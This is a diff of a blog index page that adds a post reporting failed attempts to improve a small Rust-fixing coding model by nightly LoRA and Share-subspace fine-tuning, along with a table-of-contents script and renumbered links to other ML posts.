+  white-space: nowrap;
+  font-weight: bold;
+  width: 1%;
+}
+
+@media (max-width: 600px) {
+  .references-float table {
+    font-size: 0.85em;
+  }
+}
+</style>
+
+<script>
+(function() {
+  // Run after DOM is ready
+  function initTOC() {
+    document.querySelectorAll('.toc').forEach(function(toc) {
+      if (toc.dataset.initialized) return;
+      toc.dataset.initialized = 'true';
+
+      const tocList = toc.querySelector('.toc-list');
+      if (!tocList) return;
+
+      // Find the associated post-content (next sibling or parent's post-content)
+      let article = toc.nextElementSibling;
+      while (article && !article.classList.contains('post-content')) {
+        article = article.nextElementSibling;
+      }
+      // Fallback: look for .post-content in the document (single post page)
+      if (!article) {
+        article = document.querySelector('.post-content');
+      }
+
+      if (!article) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const headings = article.querySelectorAll('h2, h3');
+
+      if (headings.length < 3) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const tocId = toc.dataset.tocId || Math.random().toString(36).substr(2, 9);
+
+      headings.forEach(function(heading, index) {
+        // Add unique ID if missing
+        if (!heading.id) {
+          heading.id = 'toc-' + tocId + '-heading-' + index;
+        }
+
+        const li = document.createElement('li');
+        li.className = 'toc-' + heading.tagName.toLowerCase();
+
+        const a = document.createElement('a');
+        a.href = '#' + heading.id;
+        a.textContent = heading.textContent;
+
+        li.appendChild(a);
+        tocList.appendChild(li);
+      });
+    });
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTOC);
+  } else {
+    initTOC();
+  }
+})();
+</script>
+<div class="post-content">
+          <p><img src="/assets/images/posts/sleeper-dreaming.png" class="post-marker" alt="" /></p>
+
+<p>What if your AI coding assistant could learn from its mistakes? Not just for one session, but across training cycles. We built exactly that—and fifty-one adapters later, learned the mistake was trying to teach it at all.</p>
+
+<div class="resource-box">
+
+  <table>
+    <thead>
+      <tr>
+        <th>Resource</th>
+        <th>Link</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Code</strong></td>
+        <td><a href="https://github.com/softwarewrighter/sleepy-coder">sleepy-coder</a></td>
+      </tr>
+      <tr>
+        <td><strong>Share Paper</strong></td>
+        <td><a href="https://arxiv.org/abs/2602.06043">arXiv:2602.06043</a></td>
+      </tr>
+      <tr>
+        <td><strong>UWSH Paper</strong></td>
+        <td><a href="https://arxiv.org/abs/2512.05117">arXiv:2512.05117</a></td>
+      </tr>
+    </tbody>
+  </table>
+
+</div>
+
+<h2 id="the-dream-daynight-learning">The Dream: Day/Night Learning</h2>
+
+<p>AI coding agents have a memory problem. They fix a bug today, then make the same mistake next week. Every session starts from the same frozen model. Nothing carries forward.</p>
+
+<p>The idea was elegant: build an agent that improves overnight.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DAY CYCLE (Inference)
+  Agent attempts to fix Rust compiler errors
+  Successes and failures are logged
+        ↓
+NIGHT CYCLE (Training)
+  Fine-tune on failure patterns using LoRA
+  Create specialized adapters
+        ↓
+EVAL
+  Test against benchmark
+  Measure improvement
+        ↓
+(repeat)
+</code></pre></div></div>
+
+<p>During the day, the agent works and we log its failures—the error messages, the broken code, and the fixes that worked. Overnight, we fine-tune the model on those failures. Each morning, a new checkpoint should wake up a little better than before.</p>
+
+<p>We based this on two papers from the Johns Hopkins team (Kaushik, Vaidya, Chaudhari, Chellappa, Yuille):</p>
+
+<ol>
+  <li>
+    <p><strong>Share LoRA Subspaces</strong> (arXiv:2602.06043) — Learn a shared low-rank basis across tasks, then train only coefficients (76x fewer parameters per task)</p>
+  </li>
+  <li>
+    <p><strong>UWSH</strong> (arXiv:2512.05117) — The Universal Weight Subspace Hypothesis suggests neural networks converge to shared spectral subspaces</p>
+  </li>
+</ol>
+
+<p>The theory was sound. The implementation worked. The results were devastating.</p>
+
+<h2 id="the-system">The System</h2>
+
+<p>The Sleepy Coder agent runs in a Rust runtime, fixing compiler errors on 30 “koans” (small coding exercises) across 5 error families:</p>
+
+<ul>
+  <li><strong>Borrow Checker</strong>: Ownership and lifetime errors</li>
+  <li><strong>Type Bounds</strong>: Missing trait implementations</li>
+  <li><strong>Result Handling</strong>: Option/Result conversions</li>
+  <li><strong>Type Mismatches</strong>: Incompatible types</li>
+  <li><strong>Missing Items</strong>: Undefined functions or modules</li>
+</ul>
+
+<p>The base model: <strong>Qwen2.5-Coder-1.5B-Instruct</strong> — small enough to train on a single GPU, capable enough to pass most koans without any fine-tuning.</p>
+
+<h2 id="the-journey-from-hope-to-reality">The Journey: From Hope to Reality</h2>
+
+<h3 id="chapter-1-naive-lora">Chapter 1: Naive LoRA</h3>
+
+<p>First attempt: standard fine-tuning on failure patterns.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Metric</th>
+      <th>Before</th>
+      <th>After</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Pass Rate</td>
+      <td>73.3%</td>
+      <td>60.0%</td>
+    </tr>
+    <tr>
+      <td>Change</td>
+      <td>—</td>
+      <td>-13.3%</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Catastrophic forgetting. The model learned the new patterns but forgot how to do everything else.</p>
+
+<h3 id="chapter-2-the-paper-chase">Chapter 2: The Paper Chase</h3>
+
+<p>We found the Share paper promising “continual learning without forgetting.” The UWSH paper provided theoretical backing: neural networks naturally converge to shared low-rank subspaces.</p>
+
+<p>Key insight from Share:</p>
+<blockquote>
+  <p>Train ONLY the coefficients. Keep the basis FROZEN.</p>
+</blockquote>
+
+<p>This meant ~21,000 trainable parameters instead of ~1.6 million. A 76x reduction.</p>
+
+<h3 id="chapter-3-the-proper-implementation">Chapter 3: The Proper Implementation</h3>
+
+<p>We rebuilt everything:</p>
+
+<ul>
+  <li><strong>Phase 1:</strong> Extract shared basis from 51 adapters via SVD</li>
+  <li><strong>Phase 2:</strong> Train only coefficient vectors (frozen basis)</li>
+  <li><strong>Phase 3:</strong> Merge and update basis periodically</li>
+</ul>
+
+<p>We trained 51 pattern-specific adapters. We followed the algorithm precisely.</p>
+
+<h3 id="chapter-4-the-stubborn-seven">Chapter 4: The Stubborn Seven</h3>
+
+<p>No matter what we tried, 7 tasks kept failing:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Task</th>
+      <th>The Problem</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>bc_003</td>
+      <td>Mutable borrow while immutable exists</td>
+    </tr>
+    <tr>
+      <td>bc_005</td>
+      <td>Double mutable borrow</td>
+    </tr>
+    <tr>
+      <td>bc_010</td>
+      <td>Returning reference to local data</td>
+    </tr>
+    <tr>
+      <td>tb_002</td>
+      <td>Missing Clone trait</td>
+    </tr>
+    <tr>
+      <td>tb_007</td>
+      <td>Missing Hash trait</td>
+    </tr>
+    <tr>
+      <td>tb_008</td>
+      <td>Missing Ord trait</td>
+    </tr>
+    <tr>
+      <td>rh_004</td>
+      <td>Option to Result conversion</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>These require deep understanding of Rust’s ownership system—something a 1.5B model can’t reliably learn.</p>
+
+<h3 id="chapter-5-the-final-score">Chapter 5: The Final Score</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Approach</th>
+      <th>Pass Rate</th>
+      <th>vs Baseline</th>
+      <th>Regressions</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Baseline (no training)</td>
+      <td>73.3%</td>
+      <td>—</td>
+      <td>0</td>
+    </tr>
+    <tr>
+      <td>Naive LoRA</td>
+      <td>60.0%</td>
+      <td>-13.3%</td>
+      <td>Many</td>
+    </tr>
+    <tr>
+      <td>Targeted LoRA (7 patterns)</td>
+      <td>63.3%</td>
+      <td>-10%</td>
+      <td>4+</td>
+    </tr>
+    <tr>
+      <td>Replay buffer</td>
+      <td>70.0%</td>
+      <td>-3.3%</td>
+      <td>2</td>
+    </tr>
+    <tr>
+      <td>Phase 2 coef-only (10K params)</td>
+      <td>66.7%</td>
+      <td>-6.6%</td>
+      <td>2</td>
+    </tr>
+    <tr>
+      <td><strong>Share Full (Ph2+Ph3)</strong></td>
+      <td><strong>73.3%</strong></td>
+      <td><strong>0%</strong></td>
+      <td><strong>0</strong></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The Share algorithm did exactly what it claimed: it prevented forgetting. But it couldn’t improve beyond baseline because <strong>there was nothing to improve.</strong></p>
+
+<h2 id="what-went-wrong">What Went Wrong</h2>
+
+<h3 id="1-the-model-already-knows">1. The Model Already Knows</h3>
+
+<p>The base model already passes 73% of patterns. Training on these patterns doesn’t add knowledge—it dilutes what’s there.</p>
+
+<h3 id="2-training-causes-forgetting">2. Training Causes Forgetting</h3>
+
+<p>Even training only on the 7 failure patterns (44 examples) caused 4 new regressions. The model’s knowledge is interconnected.</p>
+
+<h3 id="3-averaging-destroys-specialization">3. Averaging Destroys Specialization</h3>
+
+<p>The Share paper assumes task routing at inference—selecting the right coefficients for each task. We averaged coefficients, which negated any specialization.</p>
+
+<h3 id="4-more-adapters-made-it-worse">4. More Adapters Made It Worse</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Adapter Count</th>
+      <th>Pass Rate</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>6 adapters</td>
+      <td>73.3%</td>
+    </tr>
+    <tr>
+      <td>51 adapters</td>
+      <td>70.0%</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>More adapters meant more subspace dilution when averaging. The signal got lost in the noise.</p>
+
+<h2 id="the-critical-insight">The Critical Insight</h2>
+
+<p><strong>LoRA fine-tuning cannot improve a capable base model for tasks it already handles reasonably well.</strong></p>
+
+<p>The model’s knowledge is interconnected. Even 10,000 trainable parameters (0.0007% of the model) can break things. The baseline represents the ceiling, not the floor.</p>
+
+<h2 id="what-we-learned">What We Learned</h2>
+
+<ol>
+  <li>
+    <p><strong>Read the room.</strong> If your base model passes 73%, maybe it doesn’t need fine-tuning. Maybe it needs better prompts.</p>
+  </li>
+  <li>
+    <p><strong>Negative results are results.</strong> 51 failed experiments taught us more than a successful one would have.</p>
+  </li>
+  <li>
+    <p><strong>Catastrophic forgetting is real.</strong> Small models especially can’t absorb new knowledge without losing old.</p>
+  </li>
+  <li>
+    <p><strong>Share prevents forgetting, not ignorance.</strong> The algorithm does what it claims—it just can’t create knowledge from nothing.</p>
+  </li>
+  <li>
+    <p><strong>Sometimes the answer is “don’t.”</strong> The best LoRA adapter for this task is no adapter.</p>
+  </li>
+  <li>
+    <p><strong>Task routing vs averaging matters.</strong> The Share paper assumes you select coefficients based on task type, not blend them together.</p>
+  </li>
+</ol>
+
+<h2 id="paths-forward">Paths Forward</h2>
+
+<p>Since fine-tuning doesn’t work here, alternatives:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Approach</th>
+      <th>Tradeoff</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Prompt engineering</td>
+      <td>No weight changes, limited by context</td>
+    </tr>
+    <tr>
+      <td>Multi-turn repair</td>
+      <td>Uses base model reasoning, slower</td>
+    </tr>
+    <tr>
+      <td>Larger model (7B+)</td>
+      <td>More capacity to absorb knowledge</td>
+    </tr>
+    <tr>
+      <td>Task routing with Share</td>
+      <td>Select coefficients, don’t average</td>
+    </tr>
+    <tr>
+      <td>Model ensemble</td>
+      <td>Multiple models, pick best output</td>
+    </tr>
+    <tr>
+      <td>Accept baseline</td>
+      <td>73% may be good enough</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="the-numbers">The Numbers</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Experiments run:        51 adapters, multiple algorithms
+Parameters trained:     From 10K to 1.6M per adapter
+Best achieved:          73.3% (matches baseline)
+Target:                 ≥76.7%
+Conclusion:             Target not achievable with LoRA
+</code></pre></div></div>
+
+<h2 id="resources">Resources</h2>
+
+<ul>
+  <li><a href="https://github.com/softwarewrighter/sleepy-coder">sleepy-coder Repository</a></li>
+  <li><a href="https://arxiv.org/abs/2602.06043">Share LoRA Subspaces Paper (arXiv:2602.06043)</a></li>
+  <li><a href="https://arxiv.org/abs/2512.05117">UWSH Paper (arXiv:2512.05117)</a></li>
+</ul>
+
+<hr />
+
+<p><em>Sometimes the most valuable research shows what doesn’t work. Fifty-one adapters later, we know: let sleeping models lie.</em></p>
+
+
+          </div><img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
+      </li><li class="post-item" data-index="31"><p class="post-meta">February 11, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">499 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Bias-Variance Tradeoff (balance under/overfitting), Diffusion (generate by learning to denoise), KV Cache (store past keys/values), Mixed Precision (lower precision for speed), MLA (compress attention into latent space).</div><h3>
           <a class="post-link" href="/2026/02/11/five-ml-concepts-8/">
             Five ML Concepts - #8
@@ -13130,7 +17018,7 @@ Conclusion:             Target not achievable with LoRA
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="24"><p class="post-meta">February 11, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="32"><p class="post-meta">February 11, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">1046 words</span> &bull; <span class="post-read-time">6 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">From behavioral emulation to real implementation: integrating hash-based Engram memory with HuggingFace models. The gating mechanism is critical---it learns when to trust memory lookup and when hash collisions would add noise. Engram excels at exact-match retrieval, not generalization.</div><h3>
           <a class="post-link" href="/2026/02/11/deepseek-papers-part3-engram-revisited/">
             Deepseek Papers (3/3): Engram Revisited - From Emulation to Implementation
@@ -13776,7 +17664,7 @@ Output
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="25"><p class="post-meta">February 10, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="33"><p class="post-meta">February 10, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">491 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Cross-Validation (rotate held-out data), GPT (predict next token at scale), GQA (shared keys/values for efficiency), Context Window (how much the model sees), Self-Attention (each token attends to all others).</div><h3>
           <a class="post-link" href="/2026/02/10/five-ml-concepts-7/">
             Five ML Concepts - #7
@@ -14240,7 +18128,7 @@ Output
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="26"><p class="post-meta">February 9, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="34"><p class="post-meta">February 9, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">513 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Regularization (constraints to prevent overfitting), BERT (bidirectional masked language modeling), RoPE (position via rotation in attention), Prompting (craft inputs to steer outputs), Positional Encoding (tell model where tokens are).</div><h3>
           <a class="post-link" href="/2026/02/09/five-ml-concepts-6/">
             Five ML Concepts - #6
@@ -14704,7 +18592,7 @@ Output
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="27"><p class="post-meta">February 8, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="35"><p class="post-meta">February 8, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">515 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Perceptron (single linear unit ancestor), Pre-training (learn general patterns first), Speculative Decoding (draft fast, verify in parallel), In-Context Learning (adapt from prompt examples), Latent Space (internal representations where similar things cluster).</div><h3>
           <a class="post-link" href="/2026/02/08/five-ml-concepts-5/">
             Five ML Concepts - #5
@@ -15176,7 +19064,7 @@ Output
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="28"><p class="post-meta">February 7, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="36"><p class="post-meta">February 7, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">475 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Activation Functions (introduce nonlinearity), Transfer Learning (reuse knowledge across tasks), VLM (joint image-text understanding), Adam (adaptive learning rates), Superposition (many concepts in overlapping representations).</div><h3>
           <a class="post-link" href="/2026/02/07/five-ml-concepts-4/">
             Five ML Concepts - #4
@@ -15640,7 +19528,7 @@ Output
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="29"><p class="post-meta">February 6, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="37"><p class="post-meta">February 6, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">546 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Loss Function (how far off predictions are), Overfitting (memorizing vs learning), Fine-tuning (specializing pre-trained models), LoRA (efficient adaptation with small matrices), Tokenization (breaking text into digestible pieces).</div><h3>
           <a class="post-link" href="/2026/02/06/five-ml-concepts-3/">
             Five ML Concepts - #3
@@ -16104,7 +19992,7 @@ Output
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="30"><p class="post-meta">February 5, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="38"><p class="post-meta">February 5, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">1803 words</span> &bull; <span class="post-read-time">10 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Unix invented pipes. Mainframes reinvented them for records, not bytes. This Throwback Thursday recreates CMS/TSO Pipelines in Rust with a visual debugger, demonstrating record-oriented dataflow from the 1996 Olympics web server era.</div><h3>
           <a class="post-link" href="/2026/02/05/tbt-pipelines-os390/">
             TBT (2/?): Pipelines on OS/390
@@ -16850,7 +20738,7 @@ Records:  8 in -&gt; 3 out
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="31"><p class="post-meta">February 5, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="39"><p class="post-meta">February 5, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">985 words</span> &bull; <span class="post-read-time">5 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Which small AI fits your laptop? Benchmarking Phi-2, Gemma-2B, and SmolLM on the 2-3B efficient frontier. Phi-2 achieves 61.7% MMLU with only 2.7B parameters, beating models 5x larger through synthetic textbook training. Data quality beats parameters.</div><h3>
           <a class="post-link" href="/2026/02/05/small-models-part6-efficient-frontier/">
             Small Models (6/6): Which Small AI Fits YOUR Laptop?
@@ -17532,7 +21420,7 @@ python demo_chat.py
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="32"><p class="post-meta">February 5, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="40"><p class="post-meta">February 5, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">468 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Gradient Descent (walk downhill to minimize error), Attention (focus on what matters), DPO (align from preference pairs), Learning Rate (step size tradeoff), Temperature (dial between predictable and creative).</div><h3>
           <a class="post-link" href="/2026/02/05/five-ml-concepts-2/">
             Five ML Concepts - #2
@@ -17996,7 +21884,7 @@ python demo_chat.py
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="33"><p class="post-meta">February 4, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="41"><p class="post-meta">February 4, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">865 words</span> &bull; <span class="post-read-time">5 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">One billion parameters: the sweet spot for AI. Big enough to reason, small enough to run anywhere. Comparing TinyLlama, Llama-3.2-1B, StableLM, and Pythia with LoRA fine-tuning in minutes and speculative decoding for 2-3x speedups.</div><h3>
           <a class="post-link" href="/2026/02/04/small-models-part5-billion-llm/">
             Small Models (5/6): Max AI Per Watt
@@ -18642,7 +22530,7 @@ python demo_chat.py <span class="nt">--compare</span> tinyllama llama3.2-1b
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="34"><p class="post-meta">February 4, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="42"><p class="post-meta">February 4, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">433 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Backpropagation (learning by flowing error backward), Transformers (attention over all tokens), Mamba (linear-time sequence modeling), Hallucination (confident nonsense), and Embeddings (meaning as coordinates).</div><h3>
           <a class="post-link" href="/2026/02/04/five-ml-concepts-1/">
             Five ML Concepts - #1
@@ -19106,7 +22994,7 @@ python demo_chat.py <span class="nt">--compare</span> tinyllama llama3.2-1b
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="35"><p class="post-meta">February 3, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="43"><p class="post-meta">February 3, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">870 words</span> &bull; <span class="post-read-time">5 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">LLMs are black boxes. Baby Dragon Hatchling uses brain-inspired sparse coding with 80% sparsity, making only 20% of neurons active per token. When fewer neurons fire, each one carries interpretable meaning. Train it on Shakespeare and actually see what's happening inside.</div><h3>
           <a class="post-link" href="/2026/02/03/small-models-part4-bdh/">
             Small Models (4/6): This AI Has a Visible Brain
@@ -19690,7 +23578,7 @@ Input: "love" → Neurons [47, 112, 203] fire → Output
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="36"><p class="post-meta">February 3, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="44"><p class="post-meta">February 3, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">1465 words</span> &bull; <span class="post-read-time">8 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Single explorer: 0% success. Five explorers: 60% success. Sparse rewards are an information problem, not a compute problem. Using multiple scouts with different exploration strategies, we gather diverse discoveries that benefit a shared learner.</div><h3>
           <a class="post-link" href="/2026/02/03/many-eyes-learning/">
             Solving Sparse Rewards with Many Eyes
@@ -20481,7 +24369,7 @@ python experiments/plot_results.py
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="37"><p class="post-meta">February 2, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="45"><p class="post-meta">February 2, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">661 words</span> &bull; <span class="post-read-time">4 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Teaching Claude to play tic-tac-toe and trash talk using Model Context Protocol (MCP). A Rust server exposes 6 tools via JSON-RPC over stdio, proving MCP standardizes AI tool integration across any compatible language model.</div><h3>
           <a class="post-link" href="/2026/02/02/game-mcp-poc/">
             MCP: Teaching Claude to Play (and Trash Talk)
@@ -21010,7 +24898,7 @@ You: "Can you taunt me?"
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="38"><p class="post-meta">February 2, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="46"><p class="post-meta">February 2, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">815 words</span> &bull; <span class="post-read-time">5 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">27 million parameters beats o3-mini on ARC. The Hierarchical Reasoning Model separates planning from execution, mimicking the brain's dual-process theory. It achieves 40% on the hardest reasoning benchmark where most LLMs score under 5%.</div><h3>
           <a class="post-link" href="/2026/02/02/small-models-part3-hrm/">
             Small Models (3/6): Planner + Doer = Genius
@@ -21645,7 +25533,7 @@ Feedback → [Planner] → Refined Strategy
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="39"><p class="post-meta">February 2, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="47"><p class="post-meta">February 2, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">729 words</span> &bull; <span class="post-read-time">4 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Implementing Deepseek's Engram paper on conditional memory. Instead of recomputing common patterns through O(n^2) attention, Engram provides O(1) lookup for cached results. Our LoRA-based behavioral approximation achieves 58% loss reduction in 10 seconds.</div><h3>
           <a class="post-link" href="/2026/02/02/deepseek-papers-part2-engram/">
             Deepseek Papers (2/3): Engram - Conditional Memory for Transformers
@@ -22202,7 +26090,7 @@ uv pip <span class="nb">install</span> <span class="s2">"unsloth[colab-new] @ gi
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="40"><p class="post-meta">February 1, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="48"><p class="post-meta">February 1, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">705 words</span> &bull; <span class="post-read-time">4 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">A 135M parameter model goes from 0% to 75% accuracy in 5 minutes. Using knowledge graph-guided training with rejection sampling, we teach multi-hop reasoning with scaffolding during training, then remove it at inference.</div><h3>
           <a class="post-link" href="/2026/02/01/multi-hop-reasoning/">
             Multi-Hop Reasoning (1/2): Training Wheels for Small LLMs
@@ -22744,7 +26632,7 @@ make train
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="41"><p class="post-meta">February 1, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="49"><p class="post-meta">February 1, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">791 words</span> &bull; <span class="post-read-time">4 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">AI in your pocket, no internet required. Pocket Eliza++ runs MobileLLM-350M on Android via llama.cpp and JNI, creating a privacy-first therapist chatbot. The 260MB quantized model achieves ~10 tokens/second on mid-range phones.</div><h3>
           <a class="post-link" href="/2026/02/01/small-models-part2-pocket-llm/">
             Small Models (2/6): AI in Your Pocket
@@ -23344,7 +27232,7 @@ python3 eliza.py
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="42"><p class="post-meta">February 1, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="50"><p class="post-meta">February 1, 2026 &bull; Software Wrighter</p>
